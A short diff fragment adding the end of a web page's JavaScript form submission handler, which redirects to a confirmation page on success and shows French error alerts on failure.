+        }).then(response => {
+            if (response.ok) {
+                window.location.href = "done.html";
+            } else {
+                alert("Erreur lors de l'envoi.");
+            }
+        }).catch(error => {
+            alert("Erreur de connexion.");
+            console.error(error);
+        });
+    });
+});
+</script>
+</body></html>
